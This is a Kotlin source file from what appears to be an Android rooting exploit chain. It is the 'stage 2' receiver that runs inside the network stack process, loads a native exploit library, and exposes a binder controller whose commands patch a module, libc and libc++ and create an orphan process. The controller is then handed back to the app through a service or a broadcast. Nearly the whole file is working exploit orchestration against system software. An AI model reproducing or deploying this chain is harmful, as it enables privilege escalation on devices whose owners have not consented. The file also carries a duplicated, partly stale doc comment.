package dev.busung.s25uroot.dfr.stage2

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Binder
import android.os.Bundle
import android.os.IBinder
import android.os.Parcel
import android.os.RemoteException
import android.util.Log
import org.lsposed.lspromise.DirtyFrag

/**
 * Runs *inside* `com.android.networkstack.process`, after [StageHop] has sent it there.
 *
 * Two things are true here that are not true in system_server, and both are why this hop exists: a
 * library out of this APK can be loaded, and executable memory can be mapped. So this loads `libexp` -
 * the exploit - and hands the process that loaded it back to the UI as a binder, which is the only
 * direction a binder can travel between two processes this far apart.
 *
 * The load is reported rather than fatal. On an ABI the library was not built for (the artifact is
 * arm64-only), or a device where the mapping is refused, the Java hop itself is still provable from
 * this log - which is worth separating from the exploit not working.
 */
class StageReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        Log.i(TAG, "stage 2 entered network_stack")
        try {
            stageTwo(context)
        } catch (error: Throwable) {
            Log.e(TAG, "stage 2 failed", error)
        }
        Log.i(TAG, StageHop.cleanupLoadedApk(context))
    }

    private fun stageTwo(context: Context) {
        try {
            System.loadLibrary("exp")
        } catch (error: UnsatisfiedLinkError) {
            Log.e(TAG, "libexp could not be loaded (built for another ABI?): $error")
            return
        }
        val controller = object : Binder() {
            override fun onTransact(code: Int, data: Parcel, reply: Parcel?, flags: Int): Boolean {
                try {
                    when (code) {
                        // One code per step of the exploit, and one that runs them in order. They are
                        // separate because a run that stops at step three says which step refused, and
                        // that is the whole diagnosis.
                        CODE_PATCH_MODULE -> reply?.writeInt(DirtyFrag.patchMod())
                        CODE_PATCH_LIBC -> reply?.writeInt(DirtyFrag.patchLibc())
                        CODE_PATCH_CXX -> reply?.writeInt(DirtyFrag.patchCxx())
                        CODE_ORPHAN -> reply?.writeInt(DirtyFrag.createOrphanProcess())
                        CODE_RUN_ALL -> {
                            val reporter = data.readStrongBinder()
                            reply?.writeInt(DirtyFrag(reporter).runAll())
                        }
                        else -> return super.onTransact(code, data, reply, flags)
                    }
                    return true
                } catch (error: RemoteException) {
                    throw error
                } catch (error: Throwable) {
                    Log.e(TAG, "controller call $code failed", error)
                }
                return super.onTransact(code, data, reply, flags)
            }
        }

        // The service is the path now, as DFReroot's is: a broadcast sent from a boot context is the one kind
        // that is documented to be dropped, and an unattended run hops from exactly that context. The
        // broadcast survives only as the answer to a *refusal* - see [bindControllerBack], which is deliberate
        // about what "refused" can mean here.
        if (bindControllerBack(context, controller)) {
            Log.i(TAG, "controller handed back through the service")
            return
        }
        Log.w(TAG, "the service would not take the controller; falling back to the broadcast")
        context.sendBroadcast(
            Intent().apply {
                setPackage(context.packageName)
                action = EVIL_ACTION
                putExtras(Bundle().apply { putBinder(CONTROLLER, controller) })
            },
        )
    }

    /**
     * Offers the controller to the helper's [ControllerService] as well.
     *
     * Every failure here is a log line and not an error, because the broadcast follows it unconditionally: on a
     * device where the bind is refused, this run behaves exactly as it did before the service existed.
     */
    /**
     * Offers the controller to the helper's [ControllerService]. Returns whether the service took the bind.
     *
     * ## What "refused" is allowed to mean, and why that shape
     *
     * True means `bindService` accepted the request; false means it returned false or threw, and the caller
     * falls back to the broadcast. What it deliberately does **not** wait for is whether the connection
     * callback arrived, or whether the transaction succeeded.
     *
     * That is not laziness. A broadcast receiver's `onReceive` runs on the main thread, and
     * `ServiceConnection.onServiceConnected` is delivered **on the main thread too** - so waiting here for the
     * callback would be waiting on the thread this code is holding. A timeout would then fire on every run and
     * the fallback would always win: a replacement that quietly kept the old path and logged the new one as
     * broken. The bind request itself is synchronous, so it is the honest thing to branch on.
     *
     * The consequence, so it is not a mystery on the first run that hits it: if the service is bound but the
     * transaction never arrives, this run has no controller and the waiter times out. Upstream takes the same
     * bargain - their sender does not check either - and both paths log which one was taken.
     */
    private fun bindControllerBack(context: Context, controller: IBinder): Boolean {
        val intent = Intent().setComponent(ComponentName(context.packageName, ControllerService::class.java.name))
        val connection = object : ServiceConnection {
            override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
                try {
                    val data = Parcel.obtain()
                    val reply = Parcel.obtain()
                    try {
                        data.writeStrongBinder(controller)
                        service?.transact(ControllerService.CODE_CONTROLLER, data, reply, 0)
                        Log.i(TAG, "controller handed to the service (reply ${reply.readInt()})")
                    } finally {
                        reply.recycle()
                        data.recycle()
                    }
                } catch (error: Throwable) {
                    Log.w(TAG, "the controller service refused the controller: $error")
                } finally {
                    runCatching { context.unbindService(this) }
                }
            }

            override fun onServiceDisconnected(name: ComponentName?) = Unit
        }
        return try {
            context.bindService(intent, connection, Context.BIND_AUTO_CREATE)
        } catch (error: Throwable) {
            Log.w(TAG, "binding the controller service failed: $error")
            false
        }
    }

    companion object {
        const val TAG = "RMGStage2"

        /**
         * The channel the controller comes back on.
         *
         * Named after the id this APK installs under rather than typed out, because the receiver on the
         * other end registers a filter built from the same value - and two literals that have to agree
         * are two literals that can drift.
         */
        val EVIL_ACTION: String get() = "${BuildConfig.APPLICATION_ID}.CONTROLLER"

        const val CONTROLLER = "CONTROLLER"

        private const val CODE_PATCH_MODULE = 1
        private const val CODE_PATCH_LIBC = 2
        private const val CODE_PATCH_CXX = 3
        private const val CODE_ORPHAN = 4
        private const val CODE_RUN_ALL = 5
    }
}
